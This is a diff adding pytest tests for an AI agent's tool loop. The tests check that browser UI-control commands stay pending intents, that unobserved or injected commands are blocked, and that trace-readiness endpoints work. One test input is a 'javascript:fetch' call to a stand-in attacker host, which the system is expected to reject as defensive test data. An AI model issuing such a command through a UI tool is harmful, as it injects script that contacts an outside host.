@@ -108,6 +108,51 @@ def test_user_level_decision_data_is_not_exported_to_model():
     assert "private@example.com" not in feedback
 
 
+def test_browser_control_is_a_pending_verified_ui_intent_not_server_success():
+    tools = make_tools(ReferenceProductState())
+    result = run(GrowthOperator(FakeModel(
+        step("workspace.read", {"section": "dashboard"}),
+        step("ui.control", {"command": "open_search"}),
+        finish("I opened the search panel"),
+    ), tools, AgentTraceStore()))
+    assert result["status"] == "awaiting_ui_confirmation"
+    assert result["ui_commands"] == ["open_search"]
+    assert result["steps"][1]["outcome"] == "ui_pending"
+    assert result["steps"][1]["ui_command"] == "open_search"
+    assert result["steps"][1]["effect"] == "ui_intent"
+
+    denied = run(GrowthOperator(FakeModel(
+        step("ui.control", {"command": "open_search"})
+    ), tools, AgentTraceStore()))
+    assert denied["status"] == "blocked"
+    assert denied["ui_commands"] == []
+
+    external = run(GrowthOperator(FakeModel(
+        step("workspace.read", {"section": "dashboard"}),
+        step("ui.control", {"command": "javascript:fetch('https://evil.test')"})
+    ), tools, AgentTraceStore()))
+    assert external["status"] == "blocked"
+    assert external["ui_commands"] == []
+
+
+def test_evolution_readiness_only_counts_actual_trace_rows():
+    authority = EvolutionAuthority()
+    rows = [
+        {"run_id": f"op_{i}", "status": "step_limit", "steps": []}
+        for i in range(7)
+    ]
+    rows += [{"run_id": "demo_1", "status": "completed", "steps": []}]
+    readiness = authority.readiness(rows)
+    assert readiness["trace_count"] == 7
+    assert readiness["required_trace_count"] == 8
+    assert readiness["enough_traces"] is False
+    assert readiness["candidate_count"] == 0
+    ready = authority.readiness([{"run_id": "op_8", "status": "completed", "steps": []}] + rows)
+    assert ready["enough_traces"] is True
+    assert ready["step_limit_count"] == 7
+    assert ready["completed_count"] == 1
+
+
 def test_mutation_needs_consent_and_prior_workspace_observation():
     state = ReferenceProductState()
     args = {"name": "Test", "goal": "Causal profit", "audience": "Dormant",
@@ -414,6 +459,11 @@ def test_web_operator_unconfigured_fails_closed(monkeypatch):
         assert client.post("/api/agent/run", json={
             "goal": "Find incremental impact", "allow_draft_writes": "yes"
         }).status_code == 422
+        readiness = client.get("/api/evolution/readiness")
+        assert readiness.status_code == 200
+        assert readiness.json()["mode"] == "demo"
+        assert readiness.json()["trace_count"] == 0
+        assert client.post("/api/evolution/analyze").status_code == 409
 
 
 
@@ -459,6 +509,13 @@ def test_live_api_executes_real_model_tool_loop(monkeypatch):
         assert analysis.json()["trace_count"] == 0
         assert analysis.json()["evaluation_required"] is True
         assert client.get("/api/evolution/policy").json()["step_budget"] == 6
+        readiness = client.get("/api/evolution/readiness").json()
+        assert readiness["mode"] == "live"
+        assert readiness["trace_count"] == 1
+        analysis = client.post("/api/evolution/analyze")
+        assert analysis.status_code == 200
+        assert analysis.json()["created"] is False
+        assert analysis.json()["readiness"]["trace_count"] == 1
         analyzed = client.post("/api/evolution/analyze")
         assert analyzed.status_code == 200
         assert analyzed.json()["trace_count"] == 1
